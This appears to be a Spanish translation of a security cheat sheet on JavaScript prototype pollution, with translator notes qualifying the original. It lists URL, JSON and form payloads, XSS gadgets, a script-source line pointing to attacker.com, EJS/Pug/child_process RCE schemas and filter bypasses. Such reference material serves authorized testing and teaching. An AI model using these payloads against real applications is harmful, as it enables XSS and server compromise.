# 🧬 Guía rápida de contaminación de prototipos

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 ¿Qué es la contaminación de prototipos?

La **contaminación de prototipos** (prototype pollution) es una vulnerabilidad de JavaScript que permite a un atacante modificar `Object.prototype` y afectar a los objetos de la aplicación que hereden de ese prototipo.

### Impacto
- 🔴 **XSS** - Manipulación del DOM
- 🔴 **RCE** - Ejecución remota de código en el servidor (Node.js)
- 🔴 **Elusión** - Controles de seguridad
- 🔴 **DoS** - Interrupción de la aplicación

---

## 🔍 Prototipos de JavaScript

### Cómo funciona
```javascript
// Todo objeto hereda de Object.prototype, según la simplificación del original
let obj = {};
obj.__proto__ === Object.prototype  // true

// Si contaminamos el prototipo:
Object.prototype.polluted = "hacked";

// Los objetos que heredan de ese prototipo se ven afectados:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

> **Matiz de herencia:** los objetos pueden tener otro prototipo o un prototipo nulo; no todos heredan directamente de `Object.prototype`. Además, una propiedad propia puede ocultar la heredada. Véase la [explicación de Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

### Propiedades peligrosas
```javascript
__proto__
constructor
prototype
```

---

## 💉 Payloads del lado del cliente

### Mediante URL (query o fragmento)
```
# Básico
?__proto__[polluted]=value
?__proto__.polluted=value

# Constructor
?constructor[prototype][polluted]=value

# Anidado
?__proto__[__proto__][polluted]=value

# Codificado como URL
?__proto__%5Bpolluted%5D=value
```

### Mediante JSON
```javascript
// Entrada del usuario
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Anidado
{"a": {"__proto__": {"polluted": "value"}}}
```

### Mediante datos de formulario
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 Ejemplos de explotación

### XSS de DOM mediante innerHTML
```javascript
// Si el código hace lo siguiente:
element.innerHTML = obj.html || "";

// Contaminar:
?__proto__[html]=<img src=x onerror=alert(1)>

// Resultado: ¡XSS!
```

### Gadget mediante src de un script
```javascript
// Si el código hace lo siguiente:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Contaminar:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Combinación con DOM clobbering
```javascript
// Patrones habituales de gadgets
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### Gadgets de jQuery
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Explotación
?__proto__[url]=javascript:alert(1)
```

---

> **Alcance de los gadgets:** las cadenas anteriores requieren un parser o merge vulnerable y que una propiedad heredada llegue al punto de uso. DOM clobbering es una técnica distinta; la lista de propiedades no demuestra por sí sola un gadget explotable.

## 🖥️ Lado del servidor (Node.js)

### RCE mediante child_process
```javascript
// Si la aplicación utiliza spawn/exec con un objeto de opciones:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Contaminar:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// O bien:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE mediante require()
```javascript
// Payload de contaminación
{"__proto__": {"main": "./pwned.js"}}
```

### RCE en plantillas EJS
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### RCE en plantillas Pug
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

> **Compatibilidad del servidor:** los ejemplos de Node.js, EJS y Pug son esquemas históricos, no exploits completos para cualquier versión. Dependen de la función, de cómo se construyan las opciones y del acceso a archivos u otros recursos. El ejemplo con `--require /tmp/pwn.js` presupone que ese archivo existe y puede cargarse.

## 🔍 Detección

### Pruebas manuales
```javascript
// En la consola del navegador:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Si aparece "polluted", es vulnerable según el original

// Limpiar
delete Object.prototype.testPollution;
```

> **Corrección de detección:** escribir directamente en `Object.prototype` desde la consola demuestra cómo funciona la herencia; no prueba que la aplicación permita contaminarlo mediante una entrada controlada por el usuario. Para validar la vulnerabilidad, debe existir una fuente que realice esa escritura. Véase la [guía de PortSwigger](https://portswigger.net/web-security/prototype-pollution).

### Pruebas mediante URL
```
# Añadir a la URL y comprobar en la consola
?__proto__[test]=polluted

// En la consola:
({}).test  // Debería ser undefined; si aparece "polluted", indica contaminación
```

### Buscar gadgets (DOM Invader)
```
1. Instalar DOM Invader (Burp Suite)
2. Activar el modo de contaminación de prototipos
3. Navegar por la aplicación
4. Buscar sinks (puntos de uso) explotables
```

---

## 🛠️ Herramientas

| Herramienta | Finalidad |
|------|---------|
| **DOM Invader** | Extensión de Burp para detectar contaminación de prototipos |
| **ppfuzz** | Fuzzer de contaminación de prototipos |
| **ppmap** | Buscar gadgets |
| **PPScan** | Escáner del lado del cliente |

### Uso de ppmap
```bash
# Instalar
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Escanear
node ppmap.js https://target.com
```

---

## 📊 Referencia rápida

### Formatos de payloads
| Formato | Payload |
|--------|---------|
| Query | `?__proto__[x]=y` |
| Hash | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Merge | `Object.assign({},input)` |

> **Matiz de `Object.assign`:** copiar una propiedad `__proto__` puede modificar el prototipo del objeto destino; no implica por sí solo modificar globalmente `Object.prototype`. El origen de los datos y el mecanismo de asignación son relevantes. Véase la [documentación de Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

### Gadgets habituales
| Propiedad | Impacto |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Inyección de scripts |
| `href` | Redirección |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Técnicas de elusión
```javascript
// Si se filtra __proto__:
constructor.prototype.polluted = "value"

// Notación diferente
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

> **Corrección de notación:** `["__proto__"]["polluted"] = "value"` asigna una propiedad a un array temporal; por sí sola no contamina `Object.prototype`. Se conserva como ejemplo del original. Las variantes Unicode solo funcionan si la aplicación las decodifica e interpreta en una operación vulnerable.

## 📚 Recursos

- [Contaminación de prototipos en PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [Contaminación de prototipos del lado del servidor](https://portswigger.net/research/server-side-prototype-pollution)
- [Escáner de contaminación de prototipos del lado del cliente](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 ¡Investiga la contaminación de prototipos!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
